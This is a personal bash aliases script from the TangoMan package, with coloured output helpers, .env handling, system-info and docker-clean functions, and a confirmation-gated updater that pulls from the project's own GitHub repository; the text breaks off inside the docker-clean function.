#!/bin/bash

#/*
# * This file is part of TangoMan package.
# *
# * Copyright (c) 2026 "Matthias Morin" <mat@tangoman.io>
# *
# * This source file is subject to the MIT license that is bundled
# * with this source code in the file LICENSE.
# */

#--------------------------------------------------
# header
#--------------------------------------------------

# app name
# shellcheck disable=SC2034
APP_NAME=bash_aliases

# app author
# shellcheck disable=SC2034
APP_AUTHOR=tangoman75

# app version (set from latest git tag)
# shellcheck disable=SC2034
APP_VERSION=0.1.0

# app source repository
# shellcheck disable=SC2034
APP_REPOSITORY=https://github.com/tangoman75/bash_aliases

# app installation directory
# shellcheck disable=SC2034
APP_INSTALL_DIR=/home/tangoman75/Documents/bash_aliases

# app user config directory
# shellcheck disable=SC2034
APP_USER_CONFIG_DIR=/home/tangoman75/.tangoman75/bash_aliases/config

#--------------------------------------------------
# Global variables
#--------------------------------------------------

# zsh arrays lower bound start from 1
# shellcheck disable=SC2034
case "${SHELL}" in
    '/bin/bash'|'/usr/bin/bash'|'/usr/bin/ash'|'/usr/bin/sh')
        LBOUND=0
    ;;
    '/usr/bin/zsh')
        LBOUND=1
    ;;
esac

#--------------------------------------------------
# Colors global variables
#--------------------------------------------------

_PRIMARY='\033[97m'
_SECONDARY='\033[94m'
_SUCCESS='\033[32m'
_DANGER='\033[31m'
_WARNING='\033[33m'
_INFO='\033[95m'
_LIGHT='\033[47;90m'
_DARK='\033[40;37m'
_DEFAULT='\033[0m'
_EOL='\033[0m\n'

_ALERT_PRIMARY='\033[1;104;97m'
_ALERT_SECONDARY='\033[1;45;97m'
_ALERT_SUCCESS='\033[1;42;97m'
_ALERT_DANGER='\033[1;41;97m'
_ALERT_WARNING='\033[1;43;97m'
_ALERT_INFO='\033[1;44;97m'
_ALERT_LIGHT='\033[1;47;90m'
_ALERT_DARK='\033[1;40;37m'

#--------------------------------------------------
# A semantic set of colors functions
#--------------------------------------------------

# Synopsis: echo_* <STRING> [INDENTATION] [PADDING]
#  STRING:       Text to display.
#  INDENTATION:  Indentation level (default: 0).
#  PADDING:      Padding length (default: 0).

## Print primary (bright white text)
_echo_primary() {
    if [ $# -eq 1 ]; then set -- "$1" 0 0; elif [ $# -eq 2 ]; then set -- "$1" "$2" 0; fi
    printf "%*b%b%-*b%b" "$2" '' "${_PRIMARY}" "$3" "$1" "${_DEFAULT}"
}

## Print secondary (bright blue text)
_echo_secondary() {
    if [ $# -eq 1 ]; then set -- "$1" 0 0; elif [ $# -eq 2 ]; then set -- "$1" "$2" 0; fi
    printf "%*b%b%-*b%b" "$2" '' "${_SECONDARY}" "$3" "$1" "${_DEFAULT}"
}

## Print success (bright green text)
_echo_success() {
    if [ $# -eq 1 ]; then set -- "$1" 0 0; elif [ $# -eq 2 ]; then set -- "$1" "$2" 0; fi
    printf "%*b%b%-*b%b" "$2" '' "${_SUCCESS}" "$3" "$1" "${_DEFAULT}"
}

## Print danger (red text)
_echo_danger() {
    if [ $# -eq 1 ]; then set -- "$1" 0 0; elif [ $# -eq 2 ]; then set -- "$1" "$2" 0; fi
    printf "%*b%b%-*b%b" "$2" '' "${_DANGER}" "$3" "$1" "${_DEFAULT}"
}

## Print warning (orange text)
_echo_warning() {
    if [ $# -eq 1 ]; then set -- "$1" 0 0; elif [ $# -eq 2 ]; then set -- "$1" "$2" 0; fi
    printf "%*b%b%-*b%b" "$2" '' "${_WARNING}" "$3" "$1" "${_DEFAULT}"
}

## Print info (bright purple text)
_echo_info() {
    if [ $# -eq 1 ]; then set -- "$1" 0 0; elif [ $# -eq 2 ]; then set -- "$1" "$2" 0; fi
    printf "%*b%b%-*b%b" "$2" '' "${_INFO}" "$3" "$1" "${_DEFAULT}"
}

## Print light (black text over white background)
_echo_light() {
    if [ $# -eq 1 ]; then set -- "$1" 0 0; elif [ $# -eq 2 ]; then set -- "$1" "$2" 0; fi
    printf "%*b%b%-*b%b" "$2" '' "${_LIGHT}" "$3" "$1" "${_DEFAULT}"
}

## Print dark (white text over black background)
_echo_dark() {
    if [ $# -eq 1 ]; then set -- "$1" 0 0; elif [ $# -eq 2 ]; then set -- "$1" "$2" 0; fi
    printf "%*b%b%-*b%b" "$2" '' "${_DARK}" "$3" "$1" "${_DEFAULT}"
}

# Synopsis: alert_* <STRING>
#  STRING:  Text to display.

## Print primary alert (bold white text over bright blue background)
_alert_primary() {
    printf "${_EOL}%b%64s${_EOL}%b %-63s${_EOL}%b%64s${_EOL}\n" "${_ALERT_PRIMARY}" '' "${_ALERT_PRIMARY}" "$1" "${_ALERT_PRIMARY}" '';
}

## Print secondary alert (bold white text over bright purple background)
_alert_secondary() {
    printf "${_EOL}%b%64s${_EOL}%b %-63s${_EOL}%b%64s${_EOL}\n" "${_ALERT_SECONDARY}" '' "${_ALERT_SECONDARY}" "$1" "${_ALERT_SECONDARY}" '';
}

## Print success alert (bold white text over bright green background)
_alert_success() {
    printf "${_EOL}%b%64s${_EOL}%b %-63s${_EOL}%b%64s${_EOL}\n" "${_ALERT_SUCCESS}" '' "${_ALERT_SUCCESS}" "$1" "${_ALERT_SUCCESS}" '';
}

## Print danger alert (bold white text over bright red background)
_alert_danger() {
    printf "${_EOL}%b%64s${_EOL}%b %-63s${_EOL}%b%64s${_EOL}\n" "${_ALERT_DANGER}" '' "${_ALERT_DANGER}" "$1" "${_ALERT_DANGER}" '';
}

## Print warning alert (bold white text over bright orange background)
_alert_warning() {
    printf "${_EOL}%b%64s${_EOL}%b %-63s${_EOL}%b%64s${_EOL}\n" "${_ALERT_WARNING}" '' "${_ALERT_WARNING}" "$1" "${_ALERT_WARNING}" '';
}

## Print info alert (bold white text over bright blue background)
_alert_info() {
    printf "${_EOL}%b%64s${_EOL}%b %-63s${_EOL}%b%64s${_EOL}\n" "${_ALERT_INFO}" '' "${_ALERT_INFO}" "$1" "${_ALERT_INFO}" '';
}

## Print light alert (black text over white background)
_alert_light() {
    printf "${_EOL}%b%64s${_EOL}%b %-63s${_EOL}%b%64s${_EOL}\n" "${_ALERT_LIGHT}" '' "${_ALERT_LIGHT}" "$1" "${_ALERT_LIGHT}" '';
}

## Print dark alert (bold white text over black background)
_alert_dark() {
    printf "${_EOL}%b%64s${_EOL}%b %-63s${_EOL}%b%64s${_EOL}\n" "${_ALERT_DARK}" '' "${_ALERT_DARK}" "$1" "${_ALERT_DARK}" '';
}

## print TangoMan hero
function hero() {
    # shellcheck disable=SC2183
    printf "\033[0;32m _____%17s_____\n|_   _|___ ___ ___ ___|%5s|___ ___\n  | | | .'|   | . | . | | | | .'|   |\n  |_| |__,|_|_|_  |___|_|_|_|__,|_|_|\n%14s|___|%6s\033[33mtangoman.io\033[0m\n\n"
}

hero

## Create ".env" file into "~/.TangoMan75/bash_aliases/config" folder
function _create_env() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_create_env [file] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local file_path
    local folder_path

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning '_create_env\n'
                    _echo_success 'description:' 2 14; _echo_primary 'Create ".env "file\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    file_path="${arguments[${LBOUND}]}"
    folder_path="$(dirname "${file_path}")"

    #--------------------------------------------------

    if [ ! -d "${folder_path}" ]; then
        _echo_info "mkdir -p \"${folder_path}\"\n"
        mkdir -p "${folder_path}"
    fi

    if [ ! -f "${file_path}" ] ; then
        cat > "${file_path}" <<EOT
# ~/.bash_aliases will load this ".env" file

###> git ###
# Default jira server
JIRA_SERVER=

# Default git server
GIT_SERVER=

# Default git username
GIT_USERNAME=

# Use SSH
GIT_SSH=
###< git ###

###> ide ###
DEFAULT_IDE=
###< ide ###
EOT
    fi
}

_create_env "${APP_USER_CONFIG_DIR}/.env"

## Load ".env"
function _load_env() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_load_env [file] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local file_path

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning '_load_env\n'
                    _echo_success 'description:' 2 14; _echo_primary 'Load ".env" file\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    file_path="${arguments[${LBOUND}]}"

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ ! -f "${file_path}" ]; then
        _echo_danger "error: \"${file_path}\" file not found\n"
        _usage 2 8
        return 1
    fi

    # shellcheck source=/dev/null
    . "${file_path}"
}

_load_env "${APP_USER_CONFIG_DIR}/.env"

## Set parameter to ".env" file
function _set_var() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_set_env [parameter] [value] -f (file) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local file_path
    local parameter
    local value

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :f:h option; do
            case "${option}" in
                f) file_path="${OPTARG}";;
                h) _echo_warning '_set_env\n'
                    _echo_success 'description:' 2 14; _echo_primary 'Set parameter to ".env" file\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -lt 2 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 2 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ ! -f "${file_path}" ]; then
        _echo_danger "error: \"${file_path}\" file not found\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    parameter="${arguments[${LBOUND}]}"
    value="${arguments[$((LBOUND+1))]}"

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    # if parameter already exists
    if < "${file_path}" grep -q "^${parameter}=.*$"; then
        # escape forward slashes
        value=$(echo "${arguments[$((LBOUND+1))]}" | sed 's/\//\\\//g')

        _echo_info "sed -i -E \"s/${parameter}=.*\$/${parameter}=${value}/\" \"${file_path}\"\n"
        sed -i -E "s/${parameter}=.*\$/${parameter}=${value}/" "${file_path}"

        return 0
    fi

    _echo_info "printf '%s=%s\\\n' \"${parameter}\" \"${value}\" >> \"${file_path}\"\n"
    printf '%s=%s\n' "${parameter}" "${value}" >> "${file_path}"
}

## Print bash_aliases documentation
function tango-help() {
    _alert_primary "TangoMan bash_aliases v${APP_VERSION}"
    echo

    _echo_warning 'commands\n'
    # shellcheck disable=SC1004
    awk '/^function [a-zA-Z_-]+ ?\(\) ?\{/ { \
        COMMAND = substr($2, 0, index($2, "(")-1); \
        MESSAGE = substr(PREV, 4); \
        if (substr(PREV, 1, 3) == "## " && substr(COMMAND, 1, 1) != "_") \
        printf "  \033[32m%-26s \033[37m%s\033[0m\n", COMMAND, MESSAGE; \
    } { PREV = $0 }' ~/.bash_aliases
    echo

    _echo_warning 'aliases\n'
    # shellcheck disable=SC1004
    awk -F ' ## ' '/^alias [a-zA-Z_-]+=.+ ## / { \
        split($1, ALIAS, "="); \
        printf "  \033[32m%-20s \033[37m%s\033[0m\n", substr(ALIAS[1], 7), $2; \
    }' ~/.bash_aliases
}

## Print current system infos
function tango-info() {
    _alert_primary "TangoMan System Infos"
    _echo_secondary "bash_aliases version: ${APP_VERSION}\n"
    echo

    _echo_info "\$(LANG=C date)\n" 2
    _echo_primary "$(LANG=C date)\n" 2
    echo

    if [ -n "${HOSTNAME}" ]; then
        _echo_warning 'hostname\n'
        _echo_info "echo \${HOSTNAME}\n" 2
        _echo_primary "${HOSTNAME}\n" 2
        echo
    fi

    if [ -n "${HOST}" ]; then
        _echo_warning 'host\n'
        _echo_info "echo \${HOST}\n" 2
        _echo_primary "${HOST}\n" 2
        echo
    fi

    if [ -n "$(command -v uname)" ]; then
        _echo_warning 'box\n'
        _echo_info "uname -n | sed s/\$(whoami)-//\n" 2
        _echo_primary "$(uname -n | sed s/"$(whoami)"-//)\n" 2
        echo
    fi

    if [ -n "$(command -v whoami)" ]; then
        _echo_warning 'user name\n'
        _echo_info "whoami\n" 2
        _echo_primary "$(whoami)\n" 2
        echo
    fi

    if [ -n "$(command -v id)" ]; then
        _echo_warning 'user id\n'
        _echo_info "id --user\n" 2
        _echo_primary "$(id --user)\n" 2
        echo
    fi

    if [ -n "$(command -v id)" ]; then
        _echo_warning 'user groups\n'
        _echo_info "id --groups\n" 2
        _echo_primary "$(id --groups)\n" 2
        echo
    fi

    if [ -n "$(command -v id)" ]; then
        _echo_warning 'user groups id\n'
        _echo_info "id --groups --name\n" 2
        _echo_primary "$(id --groups --name)\n" 2
        echo
    fi

    if [ -n "$(command -v hostname)" ]; then
        _echo_warning 'local ip\n'
        _echo_info "hostname -i\n" 2
        _echo_primary "$(hostname -i)\n" 2
        echo
    fi

    if [ -n "$(hostname -I 2>/dev/null)" ]; then
        _echo_warning 'network ip\n'
        _echo_info "hostname -I | cut -d' ' -f1\n" 2
        _echo_primary "$(hostname -I | cut -d' ' -f1)\n" 2
        echo
    fi

    if [ -n "${USER}" ]; then
        _echo_warning 'user\n'
        _echo_info "echo \${USER}\n" 2
        _echo_primary "${USER}\n" 2
        echo
    fi

    if [ -z "${USERNAME}" ]; then
        _echo_warning 'username\n'
        _echo_info "echo \${USERNAME}\n" 2
        _echo_primary "${USERNAME}\n" 2
        echo
    fi

    if [ -n "${SHELL}" ]; then
        _echo_warning 'shell\n'
        _echo_info "echo \${SHELL}\n" 2
        _echo_primary "${SHELL}\n" 2
        echo
    fi

    if [ -n "${OSTYPE}" ]; then
        _echo_warning 'ostype\n'
        _echo_info "echo \${OSTYPE}\n" 2
        _echo_primary "${OSTYPE}\n" 2
        echo
    fi

    if [ -n "$(lsb_release -d 2>/dev/null)" ]; then
        _echo_warning 'os version\n'
        _echo_info "lsb_release -d | sed 's/Description:\\t//'\n" 2
        _echo_primary "$(lsb_release -d | sed 's/Description:\t//')\n" 2
        echo
    fi

    if [ -n "$(command -v bash)" ]; then
        _echo_warning 'bash version\n'
        _echo_info "bash --version | grep -oE 'version\s[0-9]+\.[0-9]+\.[0-9]+.+$' | sed 's/version //'\n" 2
        _echo_primary "$(bash --version | grep -oE 'version\s[0-9]+\.[0-9]+\.[0-9]+.+$' | sed 's/version //')\n" 2
        echo
    fi

    if [ -n "$(command -v zsh)" ]; then
        _echo_warning 'zsh version\n'
        _echo_info "zsh --version | sed 's/^zsh //'\n" 2
        _echo_primary "$(zsh --version | sed 's/^zsh //')\n" 2
        echo
    fi

    if [ -n "${DESKTOP_SESSION}" ]; then
        _echo_warning 'desktop_session\n'
        _echo_info "echo \${DESKTOP_SESSION}\n" 2
        _echo_primary "${DESKTOP_SESSION}\n" 2
        echo
    fi

    if [ -n "${XDG_CURRENT_DESKTOP}" ]; then
        _echo_warning 'xdg_current_desktop\n'
        _echo_info "echo \${XDG_CURRENT_DESKTOP}\n" 2
        _echo_primary "${XDG_CURRENT_DESKTOP}\n" 2
        echo
    fi

    if [ -n "$(command -v lshw)" ]; then
        _echo_warning 'network card\n'
        _echo_info "lshw -c network\n" 2
        _echo_primary "$(lshw -c network)\n"
        echo
    fi

    if [ -n "$(command -v ip)" ]; then
        _echo_warning 'ip (ifconfig)\n'
        _echo_info "ip address\n" 2
        _echo_primary "$(ip address)\n" 2
        echo
    fi

    if [ -n "$(command -v lshw)" ]; then
        _echo_warning 'System infos\n'
        _echo_info "lshw -short\n" 2
        _echo_primary "$(lshw -short)\n"
        echo
    fi
}

## Reload aliases (after update)
function tango-reload() {
    _echo_secondary 'Reload Aliases\n'
    echo

    case "${SHELL}" in
        '/usr/bin/zsh')
            _echo_info 'source ~/.zshrc\n'
            # shellcheck source=/dev/null
            source ~/.zshrc
            _echo_success ".bash_aliases version: ${APP_VERSION} reloaded\n"
        ;;
        '/usr/bin/bash')
            _echo_info 'source ~/.bashrc\n'
            # shellcheck source=/dev/null
            source ~/.bashrc
            _echo_success ".bash_aliases version: ${APP_VERSION} reloaded\n"
        ;;
        '/bin/bash')
            _echo_info 'source ~/.bashrc\n'
            # shellcheck source=/dev/null
            source ~/.bashrc
            _echo_success ".bash_aliases version: ${APP_VERSION} reloaded\n"
        ;;
        \?)
            _echo_danger "error: Shell \"${SHELL}\" not handled\n"
            return 1
        ;;
    esac
}

## Update tangoman bash_aliases
function tango-update() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'tango-update -h (help)\n'
    }

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check curl installation
    #--------------------------------------------------

    if [ ! -x "$(command -v curl)" ]; then
        _echo_danger 'error: curl required, enter: "sudo apt-get install -y curl" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local latest_version
    local local_version=()
    local remote_version=()
    local result
    # shellcheck disable=2153
    local key=${LBOUND}

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) _echo_warning 'tango-update\n';
                _echo_success 'description:' 2 14; _echo_primary "Update \"${APP_AUTHOR}\" \"${APP_NAME}\"\n"
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Get repository latest tag
    #--------------------------------------------------

    latest_version="$(curl --silent GET "https://api.github.com/repos/${APP_AUTHOR}/${APP_NAME}/tags" | grep -m 1 '"name":' | sed -E 's/.*"[vV]?([^"]+)".*/\1/')"
    if [ -z "${latest_version}" ]; then
        _echo_danger "error: could not check ${APP_AUTHOR} \"${APP_NAME}\" latest available version\n"
        return 1
    fi

    #--------------------------------------------------
    # Compare local with remote version
    #--------------------------------------------------

    # split each version string with dot character (option 4, short syntax but not shellcheck valid)
    # shellcheck disable=2207
    local_version=($(echo "${APP_VERSION}" | tr '.' ' '))
    # shellcheck disable=2207
    remote_version=($(echo "${latest_version}" | tr '.' ' '))

    if [ "${SHELL}" = /usr/bin/zsh ]; then
        UBOUND=3
    else
        UBOUND=2
    fi

    while [ "${key}" -lt "${UBOUND}" ]; do
        if [ "${local_version[$key]}" -eq "${remote_version[$key]}" ]; then
            key=$(( key + 1 ))
            continue
        elif [ "${local_version[$key]}" -lt "${remote_version[$key]}" ]; then
            result='<'
        fi
        break
    done

    #--------------------------------------------------
    # Check update available
    #--------------------------------------------------

    if [ "${result}" = '<' ]; then
        _echo_primary 'Update available for TangoMan "bash_aliases"\n'
        _echo_danger  "your version:   ${APP_VERSION}\n"
        _echo_warning "latest version: ${latest_version}\n"
    else
        _echo_info "your version:   ${APP_VERSION}\n"
        _echo_info "latest version: ${latest_version}\n"
        _echo_success 'Your version of TangoMan "bash_aliases" is up-to-date\n'

        return 0
    fi

    #--------------------------------------------------
    # Prompt user
    #--------------------------------------------------

    _echo_success 'Do you want to install new version? (yes/no) [no]: '
    read -r USER_PROMPT
    if [[ ! "${USER_PROMPT}" =~ ^[Yy](ES|es)?$ ]]; then
        return 0
    fi

    #--------------------------------------------------

    # Check install folder and clone repository
    if [ ! -d "${APP_INSTALL_DIR}" ]; then
        # Set install dir to default
        APP_INSTALL_DIR=/home/tangoman75/Documents/bash_aliases

        _echo_warning "\"${APP_INSTALL_DIR}\" not found, cloning source repository\n"

        _echo_info "git clone --depth=1 \"${APP_REPOSITORY}\" \"${APP_INSTALL_DIR}\"\n"
        git clone --depth=1 "${APP_REPOSITORY}" "${APP_INSTALL_DIR}"
    fi

    #--------------------------------------------------

    _echo_info "\"${APP_INSTALL_DIR}\" || exit 1\n"
    cd "${APP_INSTALL_DIR}" || exit 1

    _echo_info 'git pull\n'
    git pull

    _echo_info 'make install silent=true\n'
    make install silent=true

    #--------------------------------------------------

    tango-reload
}

#--------------------------------------------------
# general aliases
#--------------------------------------------------

alias cc='clear'                                                           ## Clear terminal
alias ccc='history -c && clear'                                            ## Clear terminal & history
alias h='_echo_info "history\n"; history'                                  ## Print history
alias hh='_echo_info "history|grep\n"; history|grep'                       ## Search history
alias hhh='cut -f1 -d" " ~/.bash_history|sort|uniq -c|sort -nr|head -n 30' ## Print 30 most used bash commands
alias ll='_echo_info "ls -lFh\n"; ls -lFh'                                 ## List non hidden files human readable
alias lll='_echo_info "ls -alFh\n"; ls -alFh'                              ## List all files human readable
alias mkdir='mkdir -p'                                                     ## Create directory and required parent directories
alias unmount='umount'                                                     ## Unmout drive
alias xx='exit'                                                            ## Exit terminal

alias ..='cd ..'                  ## Jump back 1 directory
alias ...='cd ../../'             ## Jump back 2 directories at a time
alias ....='cd ../../../'         ## Jump back 3 directories at a time

#--------------------------------------------------
# text editor
#--------------------------------------------------

if [ -x "$(command -v subl)" ]; then
    alias s='subl' ## Open with sublime text (requires subl)
fi

#--------------------------------------------------
# clipboard
#--------------------------------------------------

if [ -x "$(command -v xsel)" ]; then
    alias xcopy='xsel --input --clipboard'   ## Copy to clipboard with xsel (requires xsel)
    alias xpaste='xsel --output --clipboard' ## Paste from clipboard with xsel (requires xsel)
fi

if [ -x "$(command -v xclip)" ]; then
    alias clip='xclip -selection clipboard'  ## Copy selection to clipboard with xclip (requires xclip)
fi

## List installed ides
function _list_ides() {
    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local ide
    local ides=(atom code nano phpstorm pycharm pycharm-community subl vim webstorm)
    local result=''

    #--------------------------------------------------

    for ide in "${ides[@]}"; do
        if [ "$(command -v "${ide}")" ]; then
            result+="${ide} "
        fi
    done

    echo "${result}"
}

# Default ide
# shellcheck disable=SC2034
DEFAULT_IDE=

alias ide='open-in-ide' ## open-in-ide alias

## Open given files in ide
function open-in-ide() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'open-in-ide [...files] -l [line] -i (ide) -I (select ide) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local ide
    local ides
    local line
    local select_ide=false

    #--------------------------------------------------

    ides="$(_list_ides)"

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :i:l:Ih option; do
            case "${option}" in
                i) ide="${OPTARG}";;
                l) line="${OPTARG}";;
                I) select_ide=true;;
                h) _echo_warning 'open-in-ide\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Open given files in ide\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_warning "available ides: ${ides}\n"
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check handler installation
    #--------------------------------------------------

    if [ ! -x "$(command -v phpstorm-url-handler)" ]; then
        _echo_danger 'error: ide-url-handler required, visit: "https://github.com/TangoMan75/ide-url-handler" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -n "${line}" ]; then
        if [ "${line}" -lt 1 ] || [[ ! "${line}" =~ ^[0-9]+$ ]]; then
            _echo_danger 'error: "line" should be a positive integer\n'
            _usage 2 8
            return 1
        fi
    fi

    #--------------------------------------------------
    # Set default values
    #--------------------------------------------------

    if [ -z "${ide}" ] && [ -z "${DEFAULT_IDE}" ]; then
        select_ide=true
    fi

    if [ -z "${line}" ]; then
        line=1
    fi

    #--------------------------------------------------
    # Interactive select ide
    #--------------------------------------------------

    if [ "${select_ide}" = true ]; then
        # prompt user values
        PS3=$(_echo_success 'Please select default ide : ')
        select ide in $(_list_ides) 'other'; do
            # validate selection
            for item in $(_list_ides) 'other'; do
                # find selected item
                if [[ "${item}" == "${ide}" ]]; then
                    # break two encapsulation levels
                    break 2;
                fi
            done
        done
        while [ "${ide}" = 'other' ] || [ -z "${ide}" ]; do
            _echo_success 'Please enter default ide name : '
            read -r ide
            # sanitize user entry
            ide=$(echo "${ide}" | tr -d '[:space:]')
        done
    fi

    #--------------------------------------------------
    # Set default value
    #--------------------------------------------------

    if [ -z "${ide}" ]; then
        ide="${DEFAULT_IDE}"
    fi

    #--------------------------------------------------
    # Validate selection
    #--------------------------------------------------

    if [ -z "$(command -v "${ide}")" ]; then
        _echo_danger "error: invalid ide \"${ide}\"\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Set default ide
    #--------------------------------------------------

    if [ "${ide}" != "${DEFAULT_IDE}" ]; then
        _echo_info "sed -i -E s/\"^DEFAULT_IDE=.*$/DEFAULT_IDE=${ide}\"/ ~/.bash_aliases\n"
        sed -i -E s/"^DEFAULT_IDE=.*$/DEFAULT_IDE=${ide}"/ ~/.bash_aliases
    fi

    #--------------------------------------------------
    # Confirm large argument list
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 10 ]; then
        _echo_warning "Are you sure you want to open ${#arguments[@]} tabs ? (yes/no) [no]: "
        read -r USER_PROMPT
        if [[ ! "${USER_PROMPT}" =~ ^[Yy](ES|es)?$ ]]; then
            _echo_warning 'operation canceled\n'
            return 0
        fi
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    # shellcheck disable=SC2068
    for FILE_NAME in ${arguments[@]}; do
        FILE_PATH=$(realpath "${FILE_NAME}")
        if [ ! -f "${FILE_PATH}" ]; then
            _echo_warning "\"${FILE_NAME}\" file not found\n"
            continue
        fi
        _echo_info "(nohup xdg-open \"${ide}:open?url=file://${FILE_PATH}&line=${line}\" &>/dev/null &)\n"
        (nohup xdg-open "${ide}:open?url=file://${FILE_PATH}&line=${line}" &>/dev/null &)
    done
}

alias dcc='docker-clean' ## docker-clean alias

## Remove unused containers, images, networks, system and volumes
function docker-clean() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'docker-clean -a (all) -c (container) -i (image)  -n (network) -s (system) -v (volume) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local container=false
    local image=false
    local network=false
    local system=false
    local volume=false

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :acinsvh option; do
        case "${option}" in
            a) container=true;image=true;network=true;system=true;volume=true;;
            c) container=true;;
            i) image=true;;
            n) network=true;;
            s) system=true;;
            v) volume=true;;
            h) _echo_warning 'docker-clean\n';
                _echo_success 'description:' 2 14; _echo_primary 'Remove unused containers, images, networks, system and volumes\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check docker installation
    #--------------------------------------------------

    if [ ! -x "$(command -v docker)" ]; then
        _echo_danger 'error: docker required, enter: "sudo apt-get install -y docker" to install\n'
        return 1
    fi

    #--------------------------------------------------

    if [ "${container}" = false ] && [ "${image}" = false ] && [ "${network}" = false ] && [ "${system}" = false ] && [ "${volume}" = false ]; then
        _echo_danger 'error: no option given\n'
        _usage 2 14
        return 1
    fi

    #--------------------------------------------------

    if [ "${container}" = true ]; then
        _echo_info 'docker container prune --force\n'
        docker container prune --force
    fi

    if [ "${image}" = true ]; then
        _echo_info 'docker image prune --all --force\n'
        docker image prune --all --force
    fi

    if [ "${network}" = true ]; then
        _echo_info 'docker network prune --force\n'
        docker network prune --force
    fi

    # Remove all unused containers, networks, images (both dangling and unused), and optionally, volumes.
    if [ "${system}" = true ]; then
        _echo_info 'docker system prune --force\n'
